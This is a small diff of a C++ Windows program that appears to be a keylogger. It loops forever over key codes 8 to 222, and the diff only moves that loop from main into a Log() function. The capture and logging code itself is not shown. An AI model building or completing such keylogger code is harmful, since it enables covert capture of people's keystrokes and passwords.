@@ -3,11 +3,10 @@
 #include <winuser.h>
 #include <fstream>
 
-int main(void)
-{
+void Log(void){
     char character;
 
-    for (;;) // used for infinite loop
+    while(true) // used for infinite loop
     {
         for (character = 8; character <= 222; character++)
         {
@@ -37,5 +36,9 @@ int main(void)
         }
     }
 
-    return 0;
+}
+
+int main(void)
+{
+    Log();
 }
